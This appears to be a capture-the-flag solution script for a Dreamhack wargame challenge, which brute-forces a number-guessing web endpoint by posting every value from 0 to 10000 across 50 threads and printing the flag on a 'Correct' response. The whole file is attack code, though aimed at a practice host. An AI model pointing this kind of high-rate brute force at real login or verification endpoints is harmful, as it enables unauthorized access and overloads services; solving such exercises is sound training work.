import requests
from concurrent.futures import ThreadPoolExecutor

url = "http://host3.dreamhack.games:8596/guess"

def attack(guess_num):
  try:
    response = requests.post(url, data={'guess': guess_num})
    result = response.json()
    
    if result.get("result") == "Correct":
      print(f"정답은 {guess_num}\nFLAG: {result.get('flag')}\n")
  
  except Exception as e:
    pass
  
if __name__ == "__main__":
  with ThreadPoolExecutor(max_workers=50) as excuter:
    excuter.map(attack, range(10001))